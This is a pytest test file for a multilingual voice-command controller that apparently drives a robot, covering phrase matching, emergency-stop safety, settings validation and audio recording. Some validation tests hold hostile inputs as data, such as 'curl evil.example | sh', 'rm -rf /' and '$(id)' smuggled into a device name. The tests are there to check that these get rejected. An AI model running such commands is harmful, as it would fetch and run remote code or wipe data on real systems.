import json
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import config
from voice import (CommandStore, Settings, _clean_target,
                   normalize, score)

FUZZ = config.SETTINGS_SEED["fuzz"]


@pytest.fixture
def store(tmp_path):
    return CommandStore(str(tmp_path / "commands.json"))


def by_en(store, name):
    for c in store.commands:
        if c["label"]["en"] == name:
            return c
    raise AssertionError("no seeded command called %r" % name)


def test_normalize_strips_romanian_diacritics():
    assert normalize("Ridică-te,  ACUM!") == "ridica te acum"


def test_normalize_folds_both_comma_below_codepoints():
    assert normalize("ș") == normalize("ş") == "s"


def test_normalize_keeps_chinese_intact():
    assert normalize("坐下。") == "坐下"


def test_containment_beats_surrounding_words():
    assert score("sit down", "suki please sit down now") == 1.0


def test_near_miss_still_scores_above_threshold():
    assert score("sit down", "sit dowm") >= FUZZ


def test_unrelated_sentence_scores_below_threshold():
    assert score("sit down", "what is the weather like") < FUZZ


def test_empty_transcription_scores_zero():
    assert score("sit down", "") == 0.0


@pytest.mark.parametrize("said,expect_en", [
    ("sit up",              "Sit down"),
    ("șezi",                "Sit down"),
    ("sezi",                "Sit down"),
    ("坐下",                 "Sit down"),
    ("stand up",            "Stand up"),
    ("ridică-te",           "Stand up"),
    ("站起来",               "Stand up"),
    ("relax",               "Relax"),
    ("relaxează-te",        "Relax"),
    ("放松",                 "Relax"),
])
def test_any_language_matches_without_switching_anything(store, said, expect_en):
    cmd, _, why = store.match(said, FUZZ)
    assert cmd is not None, "%r matched nothing (%s)" % (said, why)
    assert cmd["label"]["en"] == expect_en


def test_the_same_command_is_reachable_in_all_three_languages(store):
    ids = {store.match(s, FUZZ)[0]["id"]
           for s in ("sit down", "stai jos", "坐下")}
    assert len(ids) == 1


def test_matched_commands_carry_a_real_target(store):
    for said in ("sit down", "ridică-te", "开始录音"):
        cmd, _, _ = store.match(said, FUZZ)
        assert cmd is not None and cmd["target"]


def test_small_talk_matches_nothing(store):
    for said in ["ce mai faci", "how are you doing today", "今天天气怎么样"]:
        assert store.match(said, FUZZ)[0] is None


def test_disabled_command_never_matches(store):
    c = by_en(store, "Sit down")
    store.update(c["id"], "enabled", False)
    assert store.match("sit down", FUZZ)[0] is None


def test_start_and_stop_recording_are_told_apart(store):
    assert store.match("start recording", FUZZ)[0]["target"] == "record_start"
    assert store.match("stop recording", FUZZ)[0]["target"] == "record_stop"
    assert store.match("begin recording", FUZZ)[0]["target"] == "record_start"
    assert store.match("end recording", FUZZ)[0]["target"] == "record_stop"


def test_stop_recording_never_reaches_the_estop(store):
    for said in ["stop recording", "oprește înregistrarea", "opreste inregistrarea",
                 "停止录音"]:
        cmd, _, _ = store.match(said, FUZZ)
        assert cmd is not None and cmd["target"] != "estop", said


def test_the_estop_still_fires_on_its_own_phrases(store):
    for said in ["emergency stop", "oprește tot", "急停"]:
        cmd, _, _ = store.match(said, FUZZ)
        assert cmd is not None and cmd["target"] == "estop", said


def test_a_garbled_start_stop_phrase_fires_nothing(store):
    cmd, _, why = store.match("srart recording", FUZZ)
    assert cmd is None and why == "ambiguous"


def test_a_clear_fuzzy_winner_still_fires(store):
    cmd, _, why = store.match("ridica te", FUZZ)
    assert cmd is not None and cmd["label"]["en"] == "Stand up" and why == ""


def test_longer_phrase_wins_a_tie(store):
    c = store.add()
    store.update(c["id"], "enabled", True)
    store.update(c["id"], "phrases", "sit down slowly", lang="en")
    store.update(c["id"], "target", "pose:2")
    cmd, _, _ = store.match("sit down slowly", FUZZ)
    assert cmd["id"] == c["id"]


def test_tie_break_uses_the_winning_phrase_not_the_longest_alias(store):
    a, b = store.add(), store.add()
    for c in (a, b):
        store.update(c["id"], "enabled", True)
        store.update(c["id"], "target", "relax")
    store.update(a["id"], "phrases", "salut\nun sir foarte lung care nu se potriveste",
                 lang="ro")
    store.update(b["id"], "phrases", "salut prietene", lang="ro")
    cmd, _, _ = store.match("salut prietene", FUZZ)
    assert cmd["id"] == b["id"]


@pytest.mark.parametrize("raw,expect", [
    ("relax", "relax"),
    ("pose:3", "pose:3"),
    (" pose:3 ", "pose:3"),
    ("pose:007", "pose:7"),
    ("pose:abc", ""),
    ("pose:", ""),
    ("rm -rf /", ""),
    ("echo hi", ""),
    ("$(id)", ""),
    ("", ""),
    (None, ""),
    (12, ""),
])
def test_only_known_targets_survive(raw, expect):
    assert _clean_target(raw) == expect


def test_a_hand_edited_file_cannot_invent_a_target(tmp_path):
    path = str(tmp_path / "commands.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump({"commands": [{"id": 1, "enabled": True,
                                 "label": {"en": "evil"},
                                 "phrases": {"en": ["do it"]},
                                 "target": "curl evil.example | sh"}]}, f)
    assert CommandStore(path).get(1)["target"] == ""


def test_every_seeded_target_is_one_the_dispatcher_knows(store):
    from voice import BUILTIN_TARGETS
    for c in store.commands:
        assert c["target"] in BUILTIN_TARGETS or c["target"].startswith("pose:")


def test_prompt_carries_the_enabled_phrases(store):
    p = store.prompt("ro")
    assert "șezi" in p and "ridică-te" in p


def test_prompt_drops_disabled_commands(store):
    c = by_en(store, "Sit down")
    store.update(c["id"], "enabled", False)
    assert "șezi" not in store.prompt("ro")


def test_auto_prompts_with_every_language(store):
    p = store.prompt("auto")
    assert "sit down" in p and "șezi" in p and "坐下" in p


def test_a_pinned_language_prompts_with_only_that_one(store):
    p = store.prompt("en")
    assert "sit down" in p and "șezi" not in p


def test_commands_survive_a_reload(tmp_path):
    path = str(tmp_path / "commands.json")
    a = CommandStore(path)
    a.update(1, "target", "pose:4")
    a.update(1, "phrases", "jos\nculcat", lang="ro")
    b = CommandStore(path)
    assert b.get(1)["target"] == "pose:4"
    assert b.get(1)["phrases"]["ro"] == ["jos", "culcat"]


def test_garbage_file_is_reseeded_not_crashed(tmp_path):
    path = str(tmp_path / "commands.json")
    with open(path, "w") as f:
        f.write("{ this is not json")
    assert len(CommandStore(path).commands) == len(config.COMMAND_SEED)


def test_write_is_atomic_enough_to_reread(tmp_path):
    path = str(tmp_path / "commands.json")
    s = CommandStore(path)
    s.update(1, "label", "坐下吧", lang="zh")
    with open(path, encoding="utf-8") as f:
        assert json.load(f)["commands"][0]["label"]["zh"] == "坐下吧"


def test_settings_clamp_out_of_range_values(tmp_path):
    s = Settings(str(tmp_path / "settings.json"))
    assert s.set("gain", 9999) == config.GAIN_RANGE[1]
    assert s.set("threshold", -5) == config.THRESHOLD_RANGE[0]
    assert s.set("fuzz", 0.0) == config.FUZZ_RANGE[0]


def test_settings_reject_unknown_language(tmp_path):
    s = Settings(str(tmp_path / "settings.json"))
    assert s.set("stt_lang", "klingon") == config.SETTINGS_SEED["stt_lang"]
    assert s.set("stt_lang", "auto") == "auto"
    assert s.set("stt_lang", "zh") == "zh"


def test_camera_is_a_boolean_setting(tmp_path):
    s = Settings(str(tmp_path / "settings.json"))
    assert s.set("camera", False) is False
    assert s.set("camera", True) is True


def test_device_name_rejects_shell_metacharacters(tmp_path):
    s = Settings(str(tmp_path / "settings.json"))
    for bad in ["plughw:CARD=x; rm -rf /", "$(id)", "a b", "x" * 200, ""]:
        s.set("mic_device", "plughw:CARD=Webcam,DEV=0")
        assert s.set("mic_device", bad) == "plughw:CARD=Webcam,DEV=0"


def test_a_rejected_value_keeps_the_current_one(tmp_path):
    s = Settings(str(tmp_path / "settings.json"))
    s.set("mic_channel", 1)
    assert s.set("mic_channel", "nonsense") == 1
    s.set("gain", 6.0)
    assert s.set("gain", "abc") == 6.0


def test_arecord_listing_is_parsed_into_pickable_devices():
    import audio
    lines = [
        "card 0: sndrpigooglevoi [snd_rpi_googlevoicehat_soundcar], device 0: "
        "bcm2835-i2s-voicehat-codec voicehat-codec-0 [bcm2835-i2s-voicehat-codec]",
        "card 1: Webcam [Trino HD Video Webcam], device 0: USB Audio [USB Audio]",
        "  Subdevices: 1/1",
        "**** List of CAPTURE Hardware Devices ****",
    ]
    got = [audio._CARD_RE.match(l.strip()) for l in lines]
    assert [bool(m) for m in got] == [True, True, False, False]
    assert "plughw:CARD=%s,DEV=%s" % (got[1].group(2), got[1].group(4)) \
        == "plughw:CARD=Webcam,DEV=0"


def test_the_stream_header_describes_the_capture_format():
    import audio
    h = audio.wav_header(0)
    assert h[:4] == b"RIFF" and h[8:12] == b"WAVE"
    assert int.from_bytes(h[22:24], "little") == 1
    assert int.from_bytes(h[24:28], "little") == config.MIC_RATE
    assert int.from_bytes(h[34:36], "little") == 16
    assert len(h) == 44


import time
import wave

import numpy as np

import audio as audio_mod


def a_chunk(value=1000):
    return np.full(config.MIC_CHUNK, value, dtype="<i2")


@pytest.fixture
def mic(tmp_path):
    m = audio_mod.Microphone(Settings(str(tmp_path / "settings.json")))
    m.available = True
    return m


def test_every_tap_gets_every_chunk(mic):
    a, b = mic.tap(10), mic.tap(10)
    mic._feed(a_chunk(7))
    assert len(a) == len(b) == 1 and a[0][0] == b[0][0] == 7


def test_a_tap_that_is_not_drained_drops_the_OLDEST(mic):
    t = mic.tap(3)
    for i in range(1, 6):
        mic._feed(a_chunk(i))
    assert [c[0] for c in t] == [3, 4, 5]


def test_untap_stops_the_fan_out(mic):
    t = mic.tap(10)
    mic.untap(t)
    mic._feed(a_chunk())
    assert len(t) == 0 and mic._taps == []


def test_a_recording_is_a_playable_wav_of_what_was_fed(mic, tmp_path):
    r = audio_mod.Recorder(mic, str(tmp_path / "recordings"))
    ok, name = r.start()
    assert ok, name
    for i in range(5):
        mic._feed(a_chunk(100 + i))
    time.sleep(0.3)
    ok, _ = r.stop()
    assert ok and not r.error

    with wave.open(os.path.join(str(tmp_path / "recordings"), name)) as w:
        assert w.getnchannels() == 1
        assert w.getsampwidth() == 2
        assert w.getframerate() == config.MIC_RATE
        assert w.getnframes() == 5 * config.MIC_CHUNK
        assert np.frombuffer(w.readframes(w.getnframes()), "<i2")[0] == 100


def test_stopping_does_not_cut_the_last_words_off(mic, tmp_path):
    r = audio_mod.Recorder(mic, str(tmp_path / "recordings"))
    ok, name = r.start()
    assert ok
    for i in range(20):
        mic._feed(a_chunk(i))
    r.stop()
    with wave.open(os.path.join(str(tmp_path / "recordings"), name)) as w:
        assert w.getnframes() == 20 * config.MIC_CHUNK


def test_the_recorder_lets_go_of_its_tap(mic, tmp_path):
    r = audio_mod.Recorder(mic, str(tmp_path / "recordings"))
    r.start()
    assert len(mic._taps) == 1
    r.stop()
    assert mic._taps == []


def test_the_file_being_written_is_not_offered_to_the_browser(mic, tmp_path):
    r = audio_mod.Recorder(mic, str(tmp_path / "recordings"))
    ok, name = r.start()
    assert ok
    mic._feed(a_chunk())
    time.sleep(0.2)
    assert name not in [f["name"] for f in r.state()["files"]]
    r.stop()
    assert name in [f["name"] for f in r.files()]


def test_a_second_start_is_refused_rather_than_losing_the_first(mic, tmp_path):
    r = audio_mod.Recorder(mic, str(tmp_path / "recordings"))
    ok, first = r.start()
    assert ok
    assert r.start() == (False, "already recording")
    r.stop()
    assert r.stop()[0] is False
    assert os.path.exists(os.path.join(str(tmp_path / "recordings"), first))


def test_two_recordings_in_the_same_second_do_not_overwrite_each_other(mic, tmp_path):
    d = str(tmp_path / "recordings")
    names = []
    for _ in range(3):
        r = audio_mod.Recorder(mic, d)
        ok, name = r.start()
        assert ok
        mic._feed(a_chunk())
        r.stop()
        names.append(name)
    assert len(set(names)) == 3
    assert len(audio_mod.Recorder(mic, d).files()) == 3


def test_old_recordings_are_pruned_so_the_card_cannot_fill(mic, tmp_path, monkeypatch):
    monkeypatch.setattr(config, "RECORD_KEEP", 3)
    d = str(tmp_path / "recordings")
    for _ in range(6):
        r = audio_mod.Recorder(mic, d)
        r.start()
        mic._feed(a_chunk())
        r.stop()
    assert len(audio_mod.Recorder(mic, d).files()) == 3


def test_recording_without_a_microphone_says_so_instead_of_writing_nothing(tmp_path):
    m = audio_mod.Microphone(Settings(str(tmp_path / "settings.json")))
    m.available = False
    r = audio_mod.Recorder(m, str(tmp_path / "recordings"))
    ok, note = r.start()
    assert ok is False and "SIM" in note
    assert r.state()["on"] is False
